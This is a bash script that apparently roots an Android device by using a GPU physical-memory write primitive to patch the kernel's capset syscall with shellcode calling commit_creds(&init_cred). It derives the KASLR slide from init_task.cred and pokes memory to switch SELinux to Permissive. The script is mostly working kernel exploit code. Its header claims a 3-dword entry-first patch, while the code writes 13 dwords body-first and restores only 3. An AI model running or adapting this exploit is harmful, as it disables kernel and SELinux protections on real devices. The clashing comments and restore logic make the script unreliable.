#!/usr/bin/env bash
# root-fast.sh — reliable temporary root via a 3-dword kernel-text patch.
#
# Two findings make this work end to end (see ROADMAP 5b/5f):
#   * the GPU must be ACTIVELY RENDERING for any of the primitives to take effect (screen on +
#     something drawing). A background screenrecord is not enough; we verify the animation is alive
#     and abort if it is not.
#   * the patch is only 3 dwords (12 bytes), not 13: tail-call commit_creds(&init_cred):
#         adrp x0, <init_cred page> ; add x0, x0, #<offset> ; b <commit_creds>
#     It is KASLR-slide aware (computed per boot from init_task.cred) and argument-agnostic, so
#     capset(NULL, NULL) triggers it. Written ENTRY-FIRST: with d1 new and d3 original a caller would
#     run the original epilogue and fault (the offset analysis in /tmp/zf9/REPORT.md).
#
# SELinux must be Permissive for the root call to survive (under Enforcing the rooted process dies),
# so this flips it, roots, then restores BOTH the text and SELinux. Everything is RAM-only.
set -u
DIR=$(cd "$(dirname "$0")" && pwd)
[ -f "$DIR/../device.env" ] && . "$DIR/../device.env"
S=${ZF9_SERIAL:?set ZF9_SERIAL (or create device.env)}
CMD=${*:-id}

PATCH=0xa8145af0                                   # PA of __do_sys_capset
ORIG=(0xd503233f 0xd10203ff 0xf800865e 0xa9047bfd 0xa9055ff8 0xa90657f6 \
      0xa9074ff4 0x910103fd 0x90010d28 0xf9448908 0xaa0103f4 0x910073e1 0xaa0003f5)
LINK_INIT_CRED=0xffffffc00a7b0ae0
LINK_COMMIT=0xffffffc008184c94
LINK_PATCH=0xffffffc008145af0

anim_on() {
    adb -s "$S" push "$DIR/../src/anim.sh" /data/local/tmp/anim.sh </dev/null >/dev/null 2>&1
    adb -s "$S" shell 'chmod 755 /data/local/tmp/anim.sh; svc power stayon true' </dev/null >/dev/null 2>&1
    adb -s "$S" shell 'input keyevent KEYCODE_WAKEUP; wm dismiss-keyguard' </dev/null >/dev/null 2>&1
    adb -s "$S" shell 'nohup sh /data/local/tmp/anim.sh >/dev/null 2>&1 &' </dev/null >/dev/null 2>&1
    sleep 4
    local n; n=$(adb -s "$S" shell 'pgrep -f anim.sh | wc -l' </dev/null 2>&1 | tr -d '\r ')
    if [ "${n:-0}" -lt 1 ]; then
        echo "[root-fast] FATAL: GPU animation is not running; the primitives will not take effect" >&2
        return 1
    fi
    echo "[root-fast] GPU animation alive ($n procs), screen awake"
}
anim_off() { adb -s "$S" shell 'pkill -f anim.sh; svc power stayon false' </dev/null >/dev/null 2>&1; }

rd() {  # $1 = physical address -> hex value
    adb -s "$S" shell "CHEESE_PROBE_ONLY=1 CHEESE_NO_RETRY=1 CHEESE_TARGET_PA=$1 timeout 120 \
/data/local/tmp/cheese_pa > /data/local/tmp/rf.txt 2>&1; grep -o 'value=0x[0-9a-f]*' /data/local/tmp/rf.txt | head -1" \
    </dev/null 2>&1 | tr -d '\r' | sed 's/value=//'
}
wr() {  # $1 = physical address, $2 = value -> echoes the POKE verdict
    adb -s "$S" shell "CHEESE_POKE=1 CHEESE_NO_RETRY=1 CHEESE_TARGET_PA=$1 CHEESE_WRITE_PA=$1 \
CHEESE_WRITE_VAL=$2 timeout 240 /data/local/tmp/cheese_pa > /data/local/tmp/rf.txt 2>&1; \
grep -o 'POKE write.*' /data/local/tmp/rf.txt" </dev/null 2>&1 | tr -d '\r'
}
wr_verified() {  # retries until the readback matches (fresh process each attempt)
    local a=$1 v=$2 i out
    for i in 1 2 3 4 5; do
        out=$(wr "$a" "$v")
        case "$out" in *VERIFIED*) echo "  $a <- $v VERIFIED"; return 0;; esac
        sleep 2
    done
    echo "  $a <- $v FAILED: $out" >&2
    return 1
}

restore() {
    echo "[root-fast] restoring text + SELinux..."
    anim_on >/dev/null 2>&1 || true
    wr_verified "$PATCH"          "${ORIG[0]}" >/dev/null 2>&1
    wr_verified "$(printf '0x%x' $((PATCH + 4)))"  "${ORIG[1]}" >/dev/null 2>&1
    wr_verified "$(printf '0x%x' $((PATCH + 8)))"  "${ORIG[2]}" >/dev/null 2>&1
    wr_verified 0xaaa40b98 0x01010001 >/dev/null 2>&1
    echo "[root-fast] text restored: $(rd "$PATCH") (expect 0xd503233f) ; selinux=$(adb -s "$S" shell getenforce </dev/null 2>&1)"
    anim_off
}
trap restore EXIT INT TERM

anim_on || exit 1

echo "[root-fast] deriving the KASLR slide from init_task.cred..."
lo=$(rd 0xaa79c640); hi=$(rd 0xaa79c644)
echo "[root-fast] init_task.cred = ${hi}${lo}"
DW=$(python3 - "$lo" "$hi" <<'PY'
import sys
lo = int(sys.argv[1], 16); hi = int(sys.argv[2], 16)
rt = (hi << 32) | lo
LINK_INIT_CRED = 0xffffffc00a7b0ae0
LINK_COMMIT    = 0xffffffc008184c94
slide = rt - LINK_INIT_CRED
assert slide % 0x200000 == 0, "slide not 2MB aligned - refusing"
ic, cc = rt, LINK_COMMIT + slide
sc = [0x58000040, 0x14000003, ic & 0xffffffff, ic >> 32,
      0x58000041, 0x14000003, cc & 0xffffffff, cc >> 32,
      0xA9BF7BFD, 0xD63F0020, 0xA8C17BFD, 0x2A1F03E0, 0xD65F03C0]
print(" ".join("%08x" % w for w in sc))
PY
)
echo "[root-fast] patch (13-dword shellcode, runtime addrs): $DW"

declare -a W=($DW)
ORD=(1 2 3 4 5 6 7 8 9 10 11 12 0)   # body first, entry (d0) last
for i in "${ORD[@]}"; do
    wr_verified "$(printf '0x%x' $((PATCH + 4 * i)))" "${W[$i]}" || { echo "[root-fast] patch incomplete - aborting"; exit 1; }
done
echo "[root-fast] text verify: $(rd "$PATCH") $(rd "$(printf '0x%x' $((PATCH + 4)))") $(rd "$(printf '0x%x' $((PATCH + 8)))")"

# The capset call itself is pure CPU, so the animation can rest during it.
wr_verified 0xaaa40b98 0x01010000 >/dev/null || { echo "[root-fast] could not set SELinux permissive"; exit 1; }
echo "[root-fast] selinux: $(adb -s "$S" shell getenforce </dev/null 2>&1)"
anim_off
echo "[root-fast] === running as root: $CMD ==="
adb -s "$S" shell "/data/local/tmp/call_capset $CMD" </dev/null 2>&1

restore
trap - EXIT INT TERM
